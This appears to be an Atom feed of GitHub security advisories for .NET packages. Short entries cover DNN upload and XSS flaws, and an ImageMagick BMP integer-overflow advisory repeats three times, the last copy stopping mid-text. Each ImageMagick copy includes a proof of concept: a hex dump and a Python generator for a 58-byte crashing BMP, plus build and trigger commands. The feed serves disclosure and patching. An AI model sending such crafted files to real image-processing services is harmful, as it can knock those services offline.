<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/nuget.rss</id>
    <title>Security Advisory for .NET packages hosted at the NuGet Gallery</title>
    <updated>2025-11-11T10:01:55.274Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anuget"/>
    <subtitle>Security Advisory for .NET packages hosted at the NuGet Gallery on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[DNN.PLATFORM] DNN Insufficient Access Control - Image Upload allows for Site Content Overwrite]]></title>
        <id>https://github.com/advisories/GHSA-3m8r-w7xg-jqvw</id>
        <link href="https://github.com/advisories/GHSA-3m8r-w7xg-jqvw"/>
        <updated>2025-10-29T21:48:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The default HTML editor provider allows unauthenticated file uploads and images can overwrite existing files.</p>
<h3 id="description">Description</h3>
<p>An unauthenticated user can upload and replace existing files allowing defacing a website and combined with other issue, injection XSS payloads.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/dnnsoftware/Dnn.Platform/security/advisories/GHSA-3m8r-w7xg-jqvw">https://github.com/dnnsoftware/Dnn.Platform/security/advisories/GHSA-3m8r-w7xg-jqvw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-64095">https://nvd.nist.gov/vuln/detail/CVE-2025-64095</a></li>
<li><a href="https://github.com/advisories/GHSA-3m8r-w7xg-jqvw">https://github.com/advisories/GHSA-3m8r-w7xg-jqvw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3m8r-w7xg-jqvw</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-10-29T21:48:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[DotNetNuke.Core] DNN vulnerable to stored cross-site-scripting (XSS) via SVG upload]]></title>
        <id>https://github.com/advisories/GHSA-hmvq-8p83-cq52</id>
        <link href="https://github.com/advisories/GHSA-hmvq-8p83-cq52"/>
        <updated>2025-10-29T21:47:51.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Sanitization of the content of uploaded SVG files was not covering all possible XSS scenarios.</p>
<h3 id="details">Details</h3>
<p>DNN validates the contents of SVG's to ensure they are valid and do not contain any malicious code. These checks were introduced as part of <code>CVE-2025-48378</code>.</p>
<p>However, the checks to ensure there are no script elements within the SVG files are not comprehensive and may allow some malicious SVG files to be uploaded.</p>
<p>As this vulnerability allows for the execution of arbitrary JavaScript code within the context of the user's browser, it can lead to a range of attacks, including data exfiltration, session hijacking, and defacement of the web application to name a few.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/dnnsoftware/Dnn.Platform/security/advisories/GHSA-hmvq-8p83-cq52">https://github.com/dnnsoftware/Dnn.Platform/security/advisories/GHSA-hmvq-8p83-cq52</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-64094">https://nvd.nist.gov/vuln/detail/CVE-2025-64094</a></li>
<li><a href="https://github.com/advisories/GHSA-hmvq-8p83-cq52">https://github.com/advisories/GHSA-hmvq-8p83-cq52</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hmvq-8p83-cq52</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-10-29T21:47:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Dnn.Platform] DNN CKEditor Provider allows unauthenticated upload out-of-the-box]]></title>
        <id>https://github.com/advisories/GHSA-2374-6cvw-qmx6</id>
        <link href="https://github.com/advisories/GHSA-2374-6cvw-qmx6"/>
        <updated>2025-10-29T21:44:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The out-of-box experience for HTML editing allows unauthenticated users to upload files. This opens a potential vector to other security issues and is not needed on most implementations.</p>
<h3 id="details">Details</h3>
<p>The new out-of-box experience blocks that endpoint to unauthenticated users. If there is a real need for the implementation to allow unauthenticated uploads, then the web.config can be edited by the implementer to remove that block and open the endpoint to the public.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/dnnsoftware/Dnn.Platform/security/advisories/GHSA-2374-6cvw-qmx6">https://github.com/dnnsoftware/Dnn.Platform/security/advisories/GHSA-2374-6cvw-qmx6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-62802">https://nvd.nist.gov/vuln/detail/CVE-2025-62802</a></li>
<li><a href="https://github.com/dnnsoftware/Dnn.Platform/commit/6497d3c35217e6e62e50d3ed7c8809eb69e3d06b">https://github.com/dnnsoftware/Dnn.Platform/commit/6497d3c35217e6e62e50d3ed7c8809eb69e3d06b</a></li>
<li><a href="https://github.com/advisories/GHSA-2374-6cvw-qmx6">https://github.com/advisories/GHSA-2374-6cvw-qmx6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2374-6cvw-qmx6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-10-29T21:44:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Magick.NET-Q8-x86] ImageMagick has Integer Overflow in BMP Decoder (ReadBMP)]]></title>
        <id>https://github.com/advisories/GHSA-9pp9-cfwx-54rm</id>
        <link href="https://github.com/advisories/GHSA-9pp9-cfwx-54rm"/>
        <updated>2025-11-03T18:32:51.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>CVE-2025-57803 claims to be patched in ImageMagick 7.1.2-2, but <strong>the fix is incomplete and ineffective</strong>. The latest version <strong>7.1.2-5 remains vulnerable</strong> to the same integer overflow attack.</p>
<p>The patch added <code>BMPOverflowCheck()</code> but placed it <strong>after</strong> the overflow occurs, making it useless. A malicious 58-byte BMP file can trigger AddressSanitizer crashes and DoS.</p>
<p><strong>Affected Versions:</strong></p>
<ul>
<li>ImageMagick &lt; 7.1.2-2 (originally reported)</li>
<li><strong>ImageMagick 7.1.2-2 through 7.1.2-5 (incomplete patch)</strong></li>
</ul>
<p><strong>Platform and Configuration Requirements:</strong></p>
<ul>
<li>32-bit systems ONLY (i386, i686, armv7l, etc.)</li>
<li>Requires <code>size_t = 4 bytes</code>. (64-bit systems are <strong>NOT vulnerable</strong> (size_t = 8 bytes))</li>
<li>Requires modified resource limits: The default <code>width</code>, <code>height</code>, and <code>area</code> limits must have been manually increased (Systems using default ImageMagick resource limits are <strong>NOT vulnerable</strong>).</li>
</ul>
<hr>
<h2 id="detailsroot-cause-analysis">Details(Root Cause Analysis)</h2>
<h3 id="vulnerable-code-location">Vulnerable Code Location</h3>
<p><strong>File:</strong> <code>coders/bmp.c</code><br><strong>Lines:</strong> 1120-1122 (in version 7.1.2-5)</p>
<h3 id="the-incomplete-patch">The Incomplete Patch</h3>
<pre><code class="language-c">// Line 1120: Integer overflow happens HERE
extent = image-&gt;columns * bmp_info.bits_per_pixel;  // OVERFLOW!

// Line 1121: Uses already-overflowed value
bytes_per_line = 4*((extent+31)/32);

// Line 1122: Checks the RESULT, not the multiplication
if (BMPOverflowCheck(bytes_per_line, image-&gt;rows) != MagickFalse)
    ThrowReaderException(CorruptImageError, "InsufficientImageDataInFile");
</code></pre>
<h3 id="why-the-patch-fails">Why the Patch Fails</h3>
<p><strong>Attack Vector (32-bit system):</strong></p>
<pre><code>Input BMP Header:
  Width: 536,870,912 (0x20000000)
  Height: 1
  Bits Per Pixel: 32

Calculation on 32-bit system:
  extent = 536,870,912 × 32
         = 17,179,869,184 (0x400000000)
         
  32-bit truncation:
  0x400000000 &amp; 0xFFFFFFFF = 0x00000000  ← Overflow to ZERO!
  
  bytes_per_line = 4 × ((0 + 31) / 32)
                 = 4 × 0
                 = 0
  
  BMPOverflowCheck(0, 1):
    return (1 != 0) &amp;&amp; (0 &gt; 4294967295UL/1)
    return True &amp;&amp; (0 &gt; 4294967295)
    return True &amp;&amp; False
    return False  ← Does NOT detect overflow!
</code></pre>
<p><strong>The check fails because:</strong></p>
<ol>
<li>The overflow happens at Line 1120 (extent calculation)</li>
<li><code>extent</code> becomes 0 due to 32-bit truncation</li>
<li><code>bytes_per_line</code> is calculated as 0 (Line 1121)</li>
<li><code>BMPOverflowCheck(0, 1)</code> returns <strong>False</strong> (no overflow detected)</li>
<li>Code proceeds with corrupted values → ASan crash</li>
</ol>
<hr>
<h2 id="pocproof-of-concept">PoC(Proof of Concept)</h2>
<h3 id="minimal-58-byte-bmp-file">Minimal 58-byte BMP File</h3>
<p><strong>Hex dump:</strong></p>
<pre><code>00000000  42 4d 3a 00 00 00 00 00  00 00 36 00 00 00 28 00  |BM:.......6...(.|
00000010  00 00 00 00 00 20 01 00  00 00 01 00 20 00 00 00  |..... ...... ...|
00000020  00 00 00 00 00 00 13 0b  00 00 13 0b 00 00 00 00  |................|
00000030  00 00 00 00 00 00 00 00  00 00                    |..........|
</code></pre>
<p><strong>Key Fields:</strong></p>
<ul>
<li>Offset 0x12: Width = <code>00 00 00 20</code> = 0x20000000 (536,870,912)</li>
<li>Offset 0x16: Height = <code>01 00 00 00</code> = 1</li>
<li>Offset 0x1C: BPP = <code>20 00</code> = 32</li>
</ul>
<h3 id="python-generator">Python Generator</h3>
<pre><code class="language-python">#!/usr/bin/env python3
import struct

width = 0x20000000   # 536,870,912
height = 1
bpp = 32

# BMP File Header (14 bytes)
file_header = b'BM'
file_header += struct.pack('&lt;I', 58)      # File size
file_header += struct.pack('&lt;HH', 0, 0)   # Reserved
file_header += struct.pack('&lt;I', 54)      # Pixel offset

# DIB Header (40 bytes)
dib_header = struct.pack('&lt;I', 40)        # Header size
dib_header += struct.pack('&lt;i', width)    # Width
dib_header += struct.pack('&lt;i', height)   # Height
dib_header += struct.pack('&lt;H', 1)        # Planes
dib_header += struct.pack('&lt;H', bpp)      # BPP
dib_header += struct.pack('&lt;I', 0)        # Compression
dib_header += struct.pack('&lt;I', 0)        # Image size
dib_header += struct.pack('&lt;i', 2835)     # X ppm
dib_header += struct.pack('&lt;i', 2835)     # Y ppm
dib_header += struct.pack('&lt;I', 0)        # Colors
dib_header += struct.pack('&lt;I', 0)        # Important colors

pixel_data = b'\x00\x00\x00\x00'

with open('overflow.bmp', 'wb') as f:
    f.write(file_header + dib_header + pixel_data)

print(f"Created overflow.bmp (58 bytes)")
</code></pre>
<hr>
<h2 id="reproduction-steps">Reproduction Steps</h2>
<h3 id="environment-setup">Environment Setup</h3>
<pre><code class="language-bash"># Use 32-bit Docker container
docker run -it --name test-32bit i386/ubuntu:latest bash

# Install dependencies
apt-get update
apt-get install -y clang build-essential wget tar \
    libpng-dev libjpeg-dev libfreetype6-dev libxml2-dev \
    zlib1g-dev liblzma-dev libbz2-dev

# Download ImageMagick 7.1.2-5
cd /tmp
wget https://github.com/ImageMagick/ImageMagick/archive/refs/tags/7.1.2-5.tar.gz
tar xzf 7.1.2-5.tar.gz
cd ImageMagick-7.1.2-5
</code></pre>
<h3 id="build-with-addresssanitizer-32-bit-important">Build with AddressSanitizer (32-bit IMPORTANT!)</h3>
<pre><code class="language-bash"># Configure for 32-bit build (CRITICAL - must be 32-bit!)
./configure \
    --host=i686-pc-linux-gnu \
    --disable-dependency-tracking \
    --disable-silent-rules \
    --disable-shared \
    --disable-openmp \
    --disable-docs \
    --without-x \
    --without-perl \
    --without-magick-plus-plus \
    --without-lqr \
    --without-zstd \
    --without-tiff \
    --with-quantum-depth=8 \
    --disable-hdri \
    CFLAGS="-O1 -g -fno-omit-frame-pointer -fsanitize=address,undefined" \
    CXXFLAGS="-O1 -g -fno-omit-frame-pointer -fsanitize=address,undefined" \
    LDFLAGS="-fsanitize=address,undefined"

make -j$(nproc)

### Trigger the Vulnerability

```bash
# Set environment to bypass cache.c limits
export ASAN_OPTIONS="detect_leaks=0:malloc_context_size=20:allocator_may_return_null=1"
export MAGICK_WIDTH_LIMIT=2000000000
export MAGICK_HEIGHT_LIMIT=2000000000
export MAGICK_AREA_LIMIT=10000000000

# Test with malicious BMP (use Python script above to create it)
./utilities/magick identify overflow.bmp
</code></pre>
<hr>
<h2 id="addresssanitizer-output">AddressSanitizer Output</h2>
<pre><code>==56720==AddressSanitizer CHECK failed: ../../../../src/libsanitizer/asan/asan_poisoning.cc:37 
"((AddrIsInMem(addr + size - (1ULL &lt;&lt; kDefaultShadowScale)))) != (0)" (0x0, 0x0)
=================================================================
==56720==AddressSanitizer CHECK failed: ../../../../src/libsanitizer/asan/asan_descriptions.cc:80 
"((0 &amp;&amp; "Address is not in memory and not in shadow?")) != (0)" (0x0, 0x0)
==56720==WARNING: ASan is ignoring requested __asan_handle_no_return: 
stack top: 0x40801000; bottom 0x4372f000; size: 0xfd0d2000 (-49471488)
False positive error reports may follow
For details see https://github.com/google/sanitizers/issues/189
</code></pre>
<p>It operates in the following environments.</p>
<pre><code>export MAGICK_WIDTH_LIMIT=2000000000
export MAGICK_HEIGHT_LIMIT=2000000000
export MAGICK_AREA_LIMIT=10000000000
</code></pre>
<h2 id="impact">Impact</h2>
<h3 id="attack-scenario">Attack Scenario</h3>
<ol>
<li>Attacker creates a 58-byte malicious BMP file</li>
<li>Uploads to web service that uses ImageMagick (on 32-bit system)</li>
<li>ImageMagick attempts to process the image</li>
<li>Integer overflow triggers AddressSanitizer crash</li>
<li>Service becomes unavailable (Denial of Service)</li>
</ol>
<p><strong>Real-world targets:</strong></p>
<ul>
<li>Web hosting platforms with image processing</li>
<li>CDN services with thumbnail generation</li>
<li>Legacy embedded systems</li>
<li>IoT devices running 32-bit Linux</li>
<li>Docker containers using 32-bit base images</li>
</ul>
<hr>
<h2 id="recommended-fix">Recommended Fix</h2>
<h3 id="correct-patch">Correct Patch</h3>
<p>The overflow check must happen <strong>before</strong> the multiplication:</p>
<pre><code class="language-c">// Add overflow check BEFORE calculating extent
if (BMPOverflowCheck(image-&gt;columns, bmp_info.bits_per_pixel) != MagickFalse)
    ThrowReaderException(CorruptImageError, "IntegerOverflowInDimensions");

// Now safe to calculate
extent = image-&gt;columns * bmp_info.bits_per_pixel;
bytes_per_line = 4*((extent+31)/32);

// Additional safety check
if (BMPOverflowCheck(bytes_per_line, image-&gt;rows) != MagickFalse)
    ThrowReaderException(CorruptImageError, "InsufficientImageDataInFile");
</code></pre>
<h3 id="alternative-use-64-bit-arithmetic">Alternative: Use 64-bit Arithmetic</h3>
<pre><code class="language-c">// Force 64-bit calculation
uint64_t extent_64 = (uint64_t)image-&gt;columns * (uint64_t)bmp_info.bits_per_pixel;

if (extent_64 &gt; UINT32_MAX)
    ThrowReaderException(CorruptImageError, "ImageDimensionsTooLarge");

extent = (size_t)extent_64;
bytes_per_line = 4*((extent+31)/32);
</code></pre>
<h3 id="credits">Credits</h3>
<p>wooseokdotkim
<a href="mailto:wooseokdotkim@gmail.com">wooseokdotkim@gmail.com</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-9pp9-cfwx-54rm">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-9pp9-cfwx-54rm</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-62171">https://nvd.nist.gov/vuln/detail/CVE-2025-62171</a></li>
<li><a href="https://github.com/ImageMagick/ImageMagick/commit/cea1693e2ded51b4cc91c70c54096cbed1691c00">https://github.com/ImageMagick/ImageMagick/commit/cea1693e2ded51b4cc91c70c54096cbed1691c00</a></li>
<li><a href="https://github.com/dlemstra/Magick.NET/releases/tag/14.9.0">https://github.com/dlemstra/Magick.NET/releases/tag/14.9.0</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2025/10/msg00019.html">https://lists.debian.org/debian-lts-announce/2025/10/msg00019.html</a></li>
<li><a href="https://github.com/advisories/GHSA-9pp9-cfwx-54rm">https://github.com/advisories/GHSA-9pp9-cfwx-54rm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9pp9-cfwx-54rm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-10-28T14:43:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Magick.NET-Q8-AnyCPU] ImageMagick has Integer Overflow in BMP Decoder (ReadBMP)]]></title>
        <id>https://github.com/advisories/GHSA-9pp9-cfwx-54rm</id>
        <link href="https://github.com/advisories/GHSA-9pp9-cfwx-54rm"/>
        <updated>2025-11-03T18:32:51.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>CVE-2025-57803 claims to be patched in ImageMagick 7.1.2-2, but <strong>the fix is incomplete and ineffective</strong>. The latest version <strong>7.1.2-5 remains vulnerable</strong> to the same integer overflow attack.</p>
<p>The patch added <code>BMPOverflowCheck()</code> but placed it <strong>after</strong> the overflow occurs, making it useless. A malicious 58-byte BMP file can trigger AddressSanitizer crashes and DoS.</p>
<p><strong>Affected Versions:</strong></p>
<ul>
<li>ImageMagick &lt; 7.1.2-2 (originally reported)</li>
<li><strong>ImageMagick 7.1.2-2 through 7.1.2-5 (incomplete patch)</strong></li>
</ul>
<p><strong>Platform and Configuration Requirements:</strong></p>
<ul>
<li>32-bit systems ONLY (i386, i686, armv7l, etc.)</li>
<li>Requires <code>size_t = 4 bytes</code>. (64-bit systems are <strong>NOT vulnerable</strong> (size_t = 8 bytes))</li>
<li>Requires modified resource limits: The default <code>width</code>, <code>height</code>, and <code>area</code> limits must have been manually increased (Systems using default ImageMagick resource limits are <strong>NOT vulnerable</strong>).</li>
</ul>
<hr>
<h2 id="detailsroot-cause-analysis">Details(Root Cause Analysis)</h2>
<h3 id="vulnerable-code-location">Vulnerable Code Location</h3>
<p><strong>File:</strong> <code>coders/bmp.c</code><br><strong>Lines:</strong> 1120-1122 (in version 7.1.2-5)</p>
<h3 id="the-incomplete-patch">The Incomplete Patch</h3>
<pre><code class="language-c">// Line 1120: Integer overflow happens HERE
extent = image-&gt;columns * bmp_info.bits_per_pixel;  // OVERFLOW!

// Line 1121: Uses already-overflowed value
bytes_per_line = 4*((extent+31)/32);

// Line 1122: Checks the RESULT, not the multiplication
if (BMPOverflowCheck(bytes_per_line, image-&gt;rows) != MagickFalse)
    ThrowReaderException(CorruptImageError, "InsufficientImageDataInFile");
</code></pre>
<h3 id="why-the-patch-fails">Why the Patch Fails</h3>
<p><strong>Attack Vector (32-bit system):</strong></p>
<pre><code>Input BMP Header:
  Width: 536,870,912 (0x20000000)
  Height: 1
  Bits Per Pixel: 32

Calculation on 32-bit system:
  extent = 536,870,912 × 32
         = 17,179,869,184 (0x400000000)
         
  32-bit truncation:
  0x400000000 &amp; 0xFFFFFFFF = 0x00000000  ← Overflow to ZERO!
  
  bytes_per_line = 4 × ((0 + 31) / 32)
                 = 4 × 0
                 = 0
  
  BMPOverflowCheck(0, 1):
    return (1 != 0) &amp;&amp; (0 &gt; 4294967295UL/1)
    return True &amp;&amp; (0 &gt; 4294967295)
    return True &amp;&amp; False
    return False  ← Does NOT detect overflow!
</code></pre>
<p><strong>The check fails because:</strong></p>
<ol>
<li>The overflow happens at Line 1120 (extent calculation)</li>
<li><code>extent</code> becomes 0 due to 32-bit truncation</li>
<li><code>bytes_per_line</code> is calculated as 0 (Line 1121)</li>
<li><code>BMPOverflowCheck(0, 1)</code> returns <strong>False</strong> (no overflow detected)</li>
<li>Code proceeds with corrupted values → ASan crash</li>
</ol>
<hr>
<h2 id="pocproof-of-concept">PoC(Proof of Concept)</h2>
<h3 id="minimal-58-byte-bmp-file">Minimal 58-byte BMP File</h3>
<p><strong>Hex dump:</strong></p>
<pre><code>00000000  42 4d 3a 00 00 00 00 00  00 00 36 00 00 00 28 00  |BM:.......6...(.|
00000010  00 00 00 00 00 20 01 00  00 00 01 00 20 00 00 00  |..... ...... ...|
00000020  00 00 00 00 00 00 13 0b  00 00 13 0b 00 00 00 00  |................|
00000030  00 00 00 00 00 00 00 00  00 00                    |..........|
</code></pre>
<p><strong>Key Fields:</strong></p>
<ul>
<li>Offset 0x12: Width = <code>00 00 00 20</code> = 0x20000000 (536,870,912)</li>
<li>Offset 0x16: Height = <code>01 00 00 00</code> = 1</li>
<li>Offset 0x1C: BPP = <code>20 00</code> = 32</li>
</ul>
<h3 id="python-generator">Python Generator</h3>
<pre><code class="language-python">#!/usr/bin/env python3
import struct

width = 0x20000000   # 536,870,912
height = 1
bpp = 32

# BMP File Header (14 bytes)
file_header = b'BM'
file_header += struct.pack('&lt;I', 58)      # File size
file_header += struct.pack('&lt;HH', 0, 0)   # Reserved
file_header += struct.pack('&lt;I', 54)      # Pixel offset

# DIB Header (40 bytes)
dib_header = struct.pack('&lt;I', 40)        # Header size
dib_header += struct.pack('&lt;i', width)    # Width
dib_header += struct.pack('&lt;i', height)   # Height
dib_header += struct.pack('&lt;H', 1)        # Planes
dib_header += struct.pack('&lt;H', bpp)      # BPP
dib_header += struct.pack('&lt;I', 0)        # Compression
dib_header += struct.pack('&lt;I', 0)        # Image size
dib_header += struct.pack('&lt;i', 2835)     # X ppm
dib_header += struct.pack('&lt;i', 2835)     # Y ppm
dib_header += struct.pack('&lt;I', 0)        # Colors
dib_header += struct.pack('&lt;I', 0)        # Important colors

pixel_data = b'\x00\x00\x00\x00'

with open('overflow.bmp', 'wb') as f:
    f.write(file_header + dib_header + pixel_data)

print(f"Created overflow.bmp (58 bytes)")
</code></pre>
<hr>
<h2 id="reproduction-steps">Reproduction Steps</h2>
<h3 id="environment-setup">Environment Setup</h3>
<pre><code class="language-bash"># Use 32-bit Docker container
docker run -it --name test-32bit i386/ubuntu:latest bash

# Install dependencies
apt-get update
apt-get install -y clang build-essential wget tar \
    libpng-dev libjpeg-dev libfreetype6-dev libxml2-dev \
    zlib1g-dev liblzma-dev libbz2-dev

# Download ImageMagick 7.1.2-5
cd /tmp
wget https://github.com/ImageMagick/ImageMagick/archive/refs/tags/7.1.2-5.tar.gz
tar xzf 7.1.2-5.tar.gz
cd ImageMagick-7.1.2-5
</code></pre>
<h3 id="build-with-addresssanitizer-32-bit-important">Build with AddressSanitizer (32-bit IMPORTANT!)</h3>
<pre><code class="language-bash"># Configure for 32-bit build (CRITICAL - must be 32-bit!)
./configure \
    --host=i686-pc-linux-gnu \
    --disable-dependency-tracking \
    --disable-silent-rules \
    --disable-shared \
    --disable-openmp \
    --disable-docs \
    --without-x \
    --without-perl \
    --without-magick-plus-plus \
    --without-lqr \
    --without-zstd \
    --without-tiff \
    --with-quantum-depth=8 \
    --disable-hdri \
    CFLAGS="-O1 -g -fno-omit-frame-pointer -fsanitize=address,undefined" \
    CXXFLAGS="-O1 -g -fno-omit-frame-pointer -fsanitize=address,undefined" \
    LDFLAGS="-fsanitize=address,undefined"

make -j$(nproc)

### Trigger the Vulnerability

```bash
# Set environment to bypass cache.c limits
export ASAN_OPTIONS="detect_leaks=0:malloc_context_size=20:allocator_may_return_null=1"
export MAGICK_WIDTH_LIMIT=2000000000
export MAGICK_HEIGHT_LIMIT=2000000000
export MAGICK_AREA_LIMIT=10000000000

# Test with malicious BMP (use Python script above to create it)
./utilities/magick identify overflow.bmp
</code></pre>
<hr>
<h2 id="addresssanitizer-output">AddressSanitizer Output</h2>
<pre><code>==56720==AddressSanitizer CHECK failed: ../../../../src/libsanitizer/asan/asan_poisoning.cc:37 
"((AddrIsInMem(addr + size - (1ULL &lt;&lt; kDefaultShadowScale)))) != (0)" (0x0, 0x0)
=================================================================
==56720==AddressSanitizer CHECK failed: ../../../../src/libsanitizer/asan/asan_descriptions.cc:80 
"((0 &amp;&amp; "Address is not in memory and not in shadow?")) != (0)" (0x0, 0x0)
==56720==WARNING: ASan is ignoring requested __asan_handle_no_return: 
stack top: 0x40801000; bottom 0x4372f000; size: 0xfd0d2000 (-49471488)
False positive error reports may follow
For details see https://github.com/google/sanitizers/issues/189
</code></pre>
<p>It operates in the following environments.</p>
<pre><code>export MAGICK_WIDTH_LIMIT=2000000000
export MAGICK_HEIGHT_LIMIT=2000000000
export MAGICK_AREA_LIMIT=10000000000
</code></pre>
<h2 id="impact">Impact</h2>
<h3 id="attack-scenario">Attack Scenario</h3>
<ol>
<li>Attacker creates a 58-byte malicious BMP file</li>
<li>Uploads to web service that uses ImageMagick (on 32-bit system)</li>
<li>ImageMagick attempts to process the image</li>
<li>Integer overflow triggers AddressSanitizer crash</li>
<li>Service becomes unavailable (Denial of Service)</li>
</ol>
<p><strong>Real-world targets:</strong></p>
<ul>
<li>Web hosting platforms with image processing</li>
<li>CDN services with thumbnail generation</li>
<li>Legacy embedded systems</li>
<li>IoT devices running 32-bit Linux</li>
<li>Docker containers using 32-bit base images</li>
</ul>
<hr>
<h2 id="recommended-fix">Recommended Fix</h2>
<h3 id="correct-patch">Correct Patch</h3>
<p>The overflow check must happen <strong>before</strong> the multiplication:</p>
<pre><code class="language-c">// Add overflow check BEFORE calculating extent
if (BMPOverflowCheck(image-&gt;columns, bmp_info.bits_per_pixel) != MagickFalse)
    ThrowReaderException(CorruptImageError, "IntegerOverflowInDimensions");

// Now safe to calculate
extent = image-&gt;columns * bmp_info.bits_per_pixel;
bytes_per_line = 4*((extent+31)/32);

// Additional safety check
if (BMPOverflowCheck(bytes_per_line, image-&gt;rows) != MagickFalse)
    ThrowReaderException(CorruptImageError, "InsufficientImageDataInFile");
</code></pre>
<h3 id="alternative-use-64-bit-arithmetic">Alternative: Use 64-bit Arithmetic</h3>
<pre><code class="language-c">// Force 64-bit calculation
uint64_t extent_64 = (uint64_t)image-&gt;columns * (uint64_t)bmp_info.bits_per_pixel;

if (extent_64 &gt; UINT32_MAX)
    ThrowReaderException(CorruptImageError, "ImageDimensionsTooLarge");

extent = (size_t)extent_64;
bytes_per_line = 4*((extent+31)/32);
</code></pre>
<h3 id="credits">Credits</h3>
<p>wooseokdotkim
<a href="mailto:wooseokdotkim@gmail.com">wooseokdotkim@gmail.com</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-9pp9-cfwx-54rm">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-9pp9-cfwx-54rm</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-62171">https://nvd.nist.gov/vuln/detail/CVE-2025-62171</a></li>
<li><a href="https://github.com/ImageMagick/ImageMagick/commit/cea1693e2ded51b4cc91c70c54096cbed1691c00">https://github.com/ImageMagick/ImageMagick/commit/cea1693e2ded51b4cc91c70c54096cbed1691c00</a></li>
<li><a href="https://github.com/dlemstra/Magick.NET/releases/tag/14.9.0">https://github.com/dlemstra/Magick.NET/releases/tag/14.9.0</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2025/10/msg00019.html">https://lists.debian.org/debian-lts-announce/2025/10/msg00019.html</a></li>
<li><a href="https://github.com/advisories/GHSA-9pp9-cfwx-54rm">https://github.com/advisories/GHSA-9pp9-cfwx-54rm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9pp9-cfwx-54rm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-10-28T14:43:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Magick.NET-Q16-x86] ImageMagick has Integer Overflow in BMP Decoder (ReadBMP)]]></title>
        <id>https://github.com/advisories/GHSA-9pp9-cfwx-54rm</id>
        <link href="https://github.com/advisories/GHSA-9pp9-cfwx-54rm"/>
        <updated>2025-11-03T18:32:51.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>CVE-2025-57803 claims to be patched in ImageMagick 7.1.2-2, but <strong>the fix is incomplete and ineffective</strong>. The latest version <strong>7.1.2-5 remains vulnerable</strong> to the same integer overflow attack.</p>
<p>The patch added <code>BMPOverflowCheck()</code> but placed it <strong>after</strong> the overflow occurs, making it useless. A malicious 58-byte BMP file can trigger AddressSanitizer crashes and DoS.</p>
<p><strong>Affected Versions:</strong></p>
<ul>
<li>ImageMagick &lt; 7.1.2-2 (originally reported)</li>
<li><strong>ImageMagick 7.1.2-2 through 7.1.2-5 (incomplete patch)</strong></li>
</ul>
<p><strong>Platform and Configuration Requirements:</strong></p>
<ul>
<li>32-bit systems ONLY (i386, i686, armv7l, etc.)</li>
<li>Requires <code>size_t = 4 bytes</code>. (64-bit systems are <strong>NOT vulnerable</strong> (size_t = 8 bytes))</li>
<li>Requires modified resource limits: The default <code>width</code>, <code>height</code>, and <code>area</code> limits must have been manually increased (Systems using default ImageMagick resource limits are <strong>NOT vulnerable</strong>).</li>
</ul>
<hr>
<h2 id="detailsroot-cause-analysis">Details(Root Cause Analysis)</h2>
<h3 id="vulnerable-code-location">Vulnerable Code Location</h3>
<p><strong>File:</strong> <code>coders/bmp.c</code><br><strong>Lines:</strong> 1120-1122 (in version 7.1.2-5)</p>
<h3 id="the-incomplete-patch">The Incomplete Patch</h3>
<pre><code class="language-c">// Line 1120: Integer overflow happens HERE
extent = image-&gt;columns * bmp_info.bits_per_pixel;  // OVERFLOW!

// Line 1121: Uses already-overflowed value
bytes_per_line = 4*((extent+31)/32);

// Line 1122: Checks the RESULT, not the multiplication
if (BMPOverflowCheck(bytes_per_line, image-&gt;rows) != MagickFalse)
